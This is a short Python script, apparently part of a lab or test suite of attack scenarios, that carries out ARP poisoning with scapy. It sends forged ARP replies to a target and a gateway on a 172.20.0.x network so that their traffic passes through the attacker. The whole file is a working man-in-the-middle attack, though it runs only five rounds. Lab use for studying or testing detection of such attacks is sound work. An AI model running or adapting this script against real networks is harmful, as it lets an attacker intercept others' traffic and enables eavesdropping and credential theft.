# attack_scenarios/mitm_attack.py
from scapy.all import ARP, send
import time

class MitMAttack:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

    def execute(self):
        print(f"[MITM] Launching ARP poisoning: {self.target_ip} <-> {self.gateway_ip}")
        for _ in range(5):
            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip), verbose=False)
            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip), verbose=False)
            time.sleep(1)

if __name__ == "__main__":
    atk = MitMAttack("172.20.0.11", "172.20.0.1")
    atk.execute()